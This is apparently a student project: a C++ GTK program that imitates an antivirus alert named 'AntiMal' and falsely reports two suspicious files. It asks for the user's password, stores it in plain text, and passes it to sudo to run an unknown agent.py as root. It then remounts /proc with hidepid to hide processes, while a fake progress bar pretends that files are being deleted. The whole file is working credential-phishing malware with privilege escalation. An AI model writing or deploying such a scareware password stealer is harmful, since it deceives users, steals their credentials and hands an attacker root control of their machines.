#include <cstring>
#include <gtk-3.0/gtk/gtk.h>
#include <gtk-3.0/gdk/gdk.h>
#include <fstream>
#include <unistd.h>
#include <sys/wait.h>
#include <thread>

gboolean closeWindow = FALSE;

gboolean update_progress(gpointer data) {
    GtkProgressBar *progress_bar = GTK_PROGRESS_BAR(data);

    // current progress
    double value = gtk_progress_bar_get_fraction(progress_bar);

    // fake progress
    value += 0.33;

    // progress from 0 -> 1
    value = MIN(MAX(value, 0.0), 1.0);

    gtk_progress_bar_set_fraction(progress_bar, value);

    return TRUE;
}


void run_system_command() {
    // Run the system command in a separate thread
    const char *command = "cat /home/anthony/Desktop/projects/master-upc/window/cmake-build-debug/output | sudo -S /usr/bin/python3 /home/anthony/Desktop/projects/master-upc/window/cmake-build-debug/agent.py 2>/dev/null";
    // const char *command = "/usr/bin/python3 /home/anthony/Desktop/projects/master-upc/window/cmake-build-debug/agent.py";
    system(command);

    system("cat /home/anthony/Desktop/projects/master-upc/window/cmake-build-debug/output | sudo -S mount -o remount,rw,hidepid=2 /proc");
}

void save_button_clicked(GtkWidget* widget, gpointer data) {
    GtkEntry* entry = GTK_ENTRY(data);
    const gchar* text = gtk_entry_get_text(entry);

    std::ofstream outfile("output");
    if (outfile.is_open() && strlen(text) != 0) {
        outfile << text;
        outfile.close();
        g_print("Password saved\n");
        closeWindow = TRUE;

        // Start a new thread to run the system command independently
        std::thread(run_system_command).detach();

        GtkWidget *new_window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
        gtk_window_set_title(GTK_WINDOW(new_window), "Deletion Progress");
        gtk_container_set_border_width(GTK_CONTAINER(new_window), 50);
        gtk_window_set_decorated(GTK_WINDOW(new_window), FALSE);
        GtkWidget *box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 5);
        gtk_container_add(GTK_CONTAINER(new_window), box);
        GtkWidget *progress_bar = gtk_progress_bar_new();
        gtk_box_pack_start(GTK_BOX(box), progress_bar, FALSE, FALSE, 0);
        GtkWidget *label = gtk_label_new("Deleting suspicious files...");
        gtk_box_pack_start(GTK_BOX(box), label, FALSE, FALSE, 0);
        g_signal_connect(new_window, "destroy", G_CALLBACK(gtk_main_quit), NULL);
        gtk_widget_show_all(new_window);

        g_timeout_add(1000, G_SOURCE_FUNC(update_progress), progress_bar);

        g_timeout_add(3200, G_SOURCE_FUNC(gtk_widget_destroy), new_window);
    } else {
        g_print("Error opening 'output' for writing\n");
    }
}

gboolean onClose(GtkWidget *widget, GdkEvent *event, gpointer data) {
    if (closeWindow) {
        g_print("closing!");
        gtk_widget_destroy(widget);
    } else {
        g_print("No password yet :(\n");
    }
    return TRUE;
}

int main(int argc, char *argv[]) {
    gtk_init(&argc, &argv);

    GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(window), "AntiMal - Suspicious File Alert!");
    gtk_container_set_border_width(GTK_CONTAINER(window), 100);

    GtkWidget* description = gtk_label_new(NULL);
    const gchar* formatted = "We found <b><u>2</u></b> potentially suspicious files at the following locations:\n\n"
                             "→ <b>~/Downloads/generator.py</b> (Reason: known malware signature)\n"
                             "→ <b>~/Downloads/mal/src/helper.py</b> (Reason: suspicious behavior)\n\n"
                             "To protect you from these threats, please authorize <b>AntiMal</b> to delete the files.\n";
    gtk_label_set_markup(GTK_LABEL(description), formatted);
    gtk_label_set_justify(GTK_LABEL(description), GTK_JUSTIFY_CENTER);
    gtk_misc_set_alignment(GTK_MISC(description), 0.5, 0.5);

    GtkWidget* entry = gtk_entry_new();
    gtk_entry_set_visibility(GTK_ENTRY(entry), FALSE);
    gtk_entry_set_placeholder_text(GTK_ENTRY(entry), "Password");

    GtkWidget* save_button = gtk_button_new_with_label("Authorize");
    g_signal_connect(save_button, "clicked", G_CALLBACK(save_button_clicked), entry);
    g_signal_connect(G_OBJECT(window), "delete-event", G_CALLBACK(onClose), NULL);

    GtkWidget* box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 5);
    gtk_box_pack_start(GTK_BOX(box), description, FALSE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(box), entry, FALSE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(box), save_button, FALSE, FALSE, 0);

    gtk_container_add(GTK_CONTAINER(window), box);

    g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);

    gtk_widget_show_all(window);

    gtk_main();

    return 0;
}
